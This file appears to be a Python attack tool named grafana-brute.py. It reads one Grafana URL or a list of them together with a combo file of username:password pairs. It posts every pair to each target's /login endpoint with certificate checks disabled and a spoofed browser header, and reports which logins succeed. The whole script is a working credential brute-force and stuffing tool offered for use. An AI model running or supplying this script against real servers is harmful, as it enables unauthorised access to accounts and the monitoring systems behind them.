#!/usr/bin/env python
#
#
# grafana-brute.py
# Read from a list of combinations for logins for grafana
# 
# Author: RandomRobbieBF

import requests
import json
import argparse
import sys
import os
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
session = requests.Session()

# Proxy to be left blank if not required.
http_proxy = ""
proxyDict = { 
              "http"  : http_proxy, 
              "https" : http_proxy, 
              "ftp"   : http_proxy
            }
def normalize_url(url):
    if not url:
        return None

    url = url.strip()

    if not url:
        return None

    if url.startswith("#"):
        return None

    if not url.startswith(("http://", "https://")):
        url = "http://" + url

    return url.rstrip("/")
    
def load_targets(args):
    """
    Hỗ trợ 2 chế độ:
    - args.url      : một target từ -u
    - args.list_url : nhiều target từ -U / --list-url

    Trả về list targets đã chuẩn hóa.
    """
    targets = []
    url = normalize_url(args.url)

    # Single target mode: -u
    if getattr(args, "url", None):
        url = normalize_url(args.url)
        if url:
            targets.append(url)

    # Multiple target mode: -U / --list-url
    if getattr(args, "list_url", None):
        try:
            with open(args.list_url, "r", encoding="utf-8") as f:
                for line in f:
                    url = normalize_url(line)
                    if url:
                        targets.append(url)

        except IOError:
            print("Target file not accessible")
            sys.exit(1)

    # Remove duplicate targets, keep original order
    unique_targets = []
    seen = set()

    for target in targets:
        if target not in seen:
            seen.add(target)
            unique_targets.append(target)

    if not unique_targets:
        print("No valid target found")
        sys.exit(1)

    return unique_targets

def main(args):
    try:
        targets = load_targets(args)

        with open(args.file) as f:
            lines = f.readlines()

        for url in targets:
            print("\n[*] Checking target: " + url)

            headers = {
                "User-Agent": "curl/7.64.1",
                "Connection": "close",
                "Accept": "*/*"
            }

            response = session.get(
                url + "/login",
                headers=headers,
                verify=False,
                timeout=10,
                proxies=proxyDict
            )

            if response.status_code != 200:
                print("http response was not 200 ok please check url: " + url)
                continue

            for line in lines:
                line = line.replace("\n", "").strip()

                if not line:
                    continue

                if ":" not in line:
                    print("Invalid combo format: " + line)
                    continue

                combo = line.split(":", 1)
                user = combo[0]
                password = combo[1]

                rawBody = json.dumps({
                    "user": user,
                    "email": "",
                    "password": password
                })

                headers2 = {
                    "Origin": url,
                    "Accept": "application/json, text/plain, */*",
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0",
                    "Connection": "close",
                    "Referer": url + "/login",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Type": "application/json;charset=utf-8"
                }

                response2 = session.post(
                    url + "/login",
                    data=rawBody,
                    headers=headers2,
                    verify=False,
                    timeout=10,
                    proxies=proxyDict
                )

                if response2.status_code != 200:
                    if response2.status_code == 401:
                        print("Target: " + url + " Username: " + user + " Password:" + password + " Failed")

                if response2.status_code == 200:
                    if "Logged in" in response2.text:
                        print("Target: " + url + " Username: " + user + " Password:" + password + " Successful")

                        # Không dùng sys.exit(0), vì sẽ dừng toàn bộ list URL.
                        break
                    else:
                        print("Target: " + url + " Username: " + user + " Password:" + password + " Failed - Check Proxy for response to see why.")

    except IOError:
        print("File not accessible")
        sys.exit(1)

    except KeyboardInterrupt:
        print("Ctrl-c pressed ...")
        sys.exit(1)

    except Exception as e:
        print('Error: %s' % e)
        sys.exit(1)         




if __name__ == '__main__':
    parser = argparse.ArgumentParser()

    target_group = parser.add_mutually_exclusive_group(required=True)

    target_group.add_argument(
        "-u",
        "--url",
        required=False,
        help="Grafana Url"
    )

    target_group.add_argument(
        "-U",
        "--list-url",
        required=False,
        help="Grafana List Url"
    )

    parser.add_argument(
        "-f",
        "--file",
        required=False,
        default="combo.txt",
        help="Combo File"
    )

    args = parser.parse_args()
    main(args)
